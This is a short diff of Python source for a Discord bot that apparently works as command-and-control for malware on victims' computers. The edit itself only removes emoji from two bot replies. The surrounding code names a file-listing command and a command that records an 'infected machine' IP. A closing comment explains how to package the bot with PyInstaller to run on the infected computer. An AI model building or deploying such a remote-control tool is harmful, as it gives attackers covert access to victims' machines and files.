@@ -173,7 +173,7 @@ async def list_files(ctx, *, dir: str): #Format: !list_files <path>
 @commands.has_permissions(manage_messages=True) #Make sure bot has make perms if possible.
 async def purge_channel(ctx, amount: int = 100): #Format: !clear_channel
     deleted = await ctx.channel.purge(limit=amount + 1)
-    await ctx.send(f"✅ Deleted {len(deleted) - 1} messages.", delete_after=3)
+    await ctx.send(f"Deleted {len(deleted) - 1} messages.", delete_after=3)
 
 @bot.command()
 async def infected_machine_ip(ctx, ip: str): #Format: !infected_machine_ip <Public_Ip>
@@ -184,7 +184,7 @@ async def infected_machine_ip(ctx, ip: str): #Format: !infected_machine_ip <Publ
         infected_ip = ip
         await ctx.send(f"Infected machine IP set to: {infected_ip}")
     except ValueError:
-        await ctx.send("❌ Invalid IP address.")
+        await ctx.send("Invalid IP address.")
 
 
 bot.run(os.getenv("BOT_TOKEN")) #USE AT YOUR OWN RISK!!!!!! YOU MAY NEED TO SETUP A SEPERATE SERVER TO AVOID EXPOSING YOUR TOKEN TO THE INFECTED COMPUTER. OTHERWISE PUT THE TOKEN THERE THEN PYINSTALLER IT!!!!!
